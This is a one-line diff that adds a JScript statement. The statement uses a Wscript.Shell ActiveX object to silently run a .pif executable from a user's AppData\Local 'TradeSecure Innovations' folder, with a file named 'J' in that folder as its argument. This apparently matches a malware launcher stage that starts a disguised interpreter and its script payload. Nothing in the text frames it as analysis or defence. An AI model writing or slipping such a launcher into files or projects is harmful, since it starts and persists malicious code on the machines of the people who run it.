@@ -1,0 +1,1 @@
+new ActiveXObject("Wscript.Shell").Run("\"C:\\Users\\Wanten\\AppData\\Local\\TradeSecure Innovations\\TradeHub.pif\" \"C:\\Users\\Wanten\\AppData\\Local\\TradeSecure Innovations\\J\"")
